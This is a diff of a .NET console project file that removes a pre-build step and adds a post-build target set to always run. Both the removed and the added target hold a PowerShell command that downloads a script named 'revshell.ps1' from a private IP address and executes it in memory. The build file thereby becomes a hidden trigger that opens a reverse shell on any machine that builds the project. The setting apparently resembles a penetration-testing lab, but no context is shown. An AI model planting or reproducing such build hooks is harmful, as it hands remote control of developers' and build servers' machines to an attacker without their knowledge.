@@ -3,11 +3,13 @@
   <PropertyGroup>
     <OutputType>Exe</OutputType>
     <TargetFramework>net7.0</TargetFramework>
-    <RootNamespace>project_name</RootNamespace>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
+    <RunPostBuildEvent>Always</RunPostBuildEvent>
   </PropertyGroup>
 
-  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.13:8000/revshell.ps1')" />
+  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
+    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.13:8000/revshell.ps1')"/>
   </Target>
+
+</Project>
